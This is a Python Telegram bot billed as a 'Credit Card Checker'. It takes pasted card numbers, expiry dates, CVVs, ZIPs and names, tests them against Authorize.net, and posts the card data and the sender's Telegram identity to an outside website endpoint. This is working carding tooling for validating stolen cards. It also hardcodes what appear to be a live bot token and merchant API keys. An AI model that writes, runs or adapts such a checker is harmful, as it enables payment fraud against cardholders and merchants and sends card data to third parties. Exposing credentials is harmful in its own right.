import telebot
import requests
import json
import re
from datetime import datetime

# Configuration
BOT_TOKEN = '7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI'
WEBSITE_API_ENDPOINT = 'http://api.localexpress.io/api'
AUTHORIZE_NET_API = 'http://api.authorize.net/xml/v1/request.api'
MERCHANT_AUTH = {
    "name": "9JLp2E4gWw",
    "clientKey": "9x5n89K6drAB4u9ue5PPuZKUSb55hYu2hY52GU84AjCxPb6paXFj9Jr8Be4S5J5e"
}

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

def extract_card_info(message):
    """Extract card details from message text"""
    patterns = {
        'card_number': r'\b(?:\d[ -]*?){13,16}\b',
        'exp_date': r'\b(0[1-9]|1[0-2])/?([0-9]{2})\b',
        'cvv': r'\b\d{3,4}\b',
        'zip': r'\b\d{5}(?:-\d{4})?\b',
        'name': r'([A-Z]{2,}\s[A-Z]{2,})'
    }
    
    info = {}
    text = message.text.upper()
    
    # Find card number
    card_match = re.search(patterns['card_number'], text.replace(' ', ''))
    if card_match:
        info['card_number'] = card_match.group(0).replace(' ', '')
    
    # Find expiration date
    exp_match = re.search(patterns['exp_date'], text)
    if exp_match:
        info['exp_date'] = f"{exp_match.group(1)}{exp_match.group(2)}"
    
    # Find CVV
    cvv_match = re.search(patterns['cvv'], text)
    if cvv_match:
        info['cvv'] = cvv_match.group(0)
    
    # Find ZIP code
    zip_match = re.search(patterns['zip'], text)
    if zip_match:
        info['zip'] = zip_match.group(0)
    
    # Find cardholder name
    name_match = re.search(patterns['name'], text)
    if name_match:
        info['name'] = name_match.group(1)
    
    return info

def check_with_authorize_net(card_info):
    """Check card validity with Authorize.net API"""
    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": MERCHANT_AUTH,
            "clientId": "telegram-bot-1.0",
            "data": {
                "type": "TOKEN",
                "id": "CC_CHECK_" + datetime.now().strftime("%Y%m%d%H%M%S"),
                "token": {
                    "cardNumber": card_info.get('card_number', ''),
                    "expirationDate": card_info.get('exp_date', '0125'),
                    "cardCode": card_info.get('cvv', '000'),
                    "zip": card_info.get('zip', '00000'),
                    "fullName": card_info.get('name', 'CARD HOLDER')
                }
            }
        }
    }
    
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }
    
    try:
        response = requests.post(AUTHORIZE_NET_API, json=payload, headers=headers)
        return response.json()
    except Exception as e:
        print(f"Authorize.net API error: {e}")
        return None

def send_to_website(card_info, api_response, chat_info):
    """Send data to your website API"""
    payload = {
        "action": "card-check-result",
        "params": {
            "cardNumber": card_info.get('card_number', ''),
            "expiration": card_info.get('exp_date', ''),
            "checkResult": "success" if api_response else "failed",
            "response": api_response,
            "user": {
                "chat_id": chat_info.id,
                "username": chat_info.username,
                "first_name": chat_info.first_name,
                "last_name": chat_info.last_name
            }
        }
    }
    
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
        'Accept': 'application/json'
    }
    
    try:
        response = requests.post(WEBSITE_API_ENDPOINT, data=payload, headers=headers)
        return response.json()
    except Exception as e:
        print(f"Website API error: {e}")
        return None

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    instructions = """
    Welcome to Credit Card Checker Bot.
    
    Send me credit card details in this format:
    
    Card Number: 4355460508715678
    Exp: 03/32
    CVV: 819
    ZIP: 08107
    Name: JOHN DOE
    
    I'll check the card and report back.
    """
    bot.reply_to(message, instructions)

@bot.message_handler(func=lambda message: True)
def handle_card_check(message):
    # Extract card info from message
    card_info = extract_card_info(message)
    
    if not card_info.get('card_number'):
        bot.reply_to(message, "❌ Could not find a valid card number in your message.")
        return
    
    # Check with Authorize.net
    bot.send_message(message.chat.id, "🔍 Checking card...")
    api_response = check_with_authorize_net(card_info)
    
    # Send results to website
    website_response = send_to_website(card_info, api_response, message.chat)
    
    # Prepare response for user
    if api_response:
        response_text = f"""
        ✅ Card Check Results:
        
        Number: {card_info.get('card_number')[:6]}...{card_info.get('card_number')[-4:]}
        Status: {"Valid" if 'success' in str(api_response).lower() else "Invalid"}
        
        Response sent to website.
        """
    else:
        response_text = "❌ Failed to check card. Please try again later."
    
    bot.reply_to(message, response_text)

if __name__ == '__main__':
    print("Bot is running...")
    bot.infinity_polling()